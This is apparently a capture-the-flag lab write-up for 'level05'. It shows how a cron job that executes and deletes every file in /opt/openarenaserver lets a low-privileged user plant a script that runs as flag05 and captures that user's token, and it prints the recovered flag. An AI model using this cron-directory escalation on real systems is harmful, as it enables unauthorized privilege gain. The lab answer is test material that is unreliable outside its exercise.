@@ -1,0 +1,41 @@
+solution level05:
+
+-> we get a message once we log with the user level05
+"You have new mail."
+
+-> cd var/mail
+
+-> cat level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+This is a cron task -> the shell script openarenaserver will get executed every 2 minutes
+
+-> ls -la /usr/sbin/openarenaserver
+-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
+the + indicates that some special file permissions have been set
+
+-> getfacl /usr/sbin/openarenaserver
+# file: usr/sbin/openarenaserver
+# owner: flag05
+# group: flag05
+...
+user:level05:r--
+...
+
+-> we can read the script with cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+the script executes then deletes every file in /opt/openarenaserver
+
+-> we create an exploit
+echo 'bin/getflag > /tmp/flag' > /opt/openarenaserver/getflag
+
+this will print the result of getflag in /tmp/flag when the task is executed
+
+-> cat /tmp/flag
+
+Check flag.Here is your token : viuaaale9huek52boumoomioc
